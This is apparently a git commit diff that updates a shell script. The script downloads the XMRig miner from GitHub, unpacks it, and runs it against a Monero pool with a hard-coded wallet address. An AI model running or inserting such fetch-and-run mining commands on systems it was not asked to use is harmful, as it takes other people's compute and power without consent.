61af812c916d12a22440fffb7a5c415255f8f1f2
Artem Billevich <75508060+Billar42@users.noreply.github.com>
2022-03-16 17:37:19 +0300

    Update billar.sh

--- billar.sh
+++ billar.sh
@@ -1,4 +1,4 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
-tar xf xmrig-6.16.4-focal-x64.tar.gz
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz
+tar xf xmrig-6.16.4-linux-x64.tar.gz
 cd xmrig-6.16.4
 ./xmrig -o pool.minexmr.com:443 -u 485df7Wd68uQ146fKP8A7SLophoSP7WXm1pVMuu51e9DVwBJ6wYaGQEbGDnb9NMQBZfE2kSKCjCV99HuLaCQxkmLKc5dt9H -k --tls --rig-id "CPU TEST"
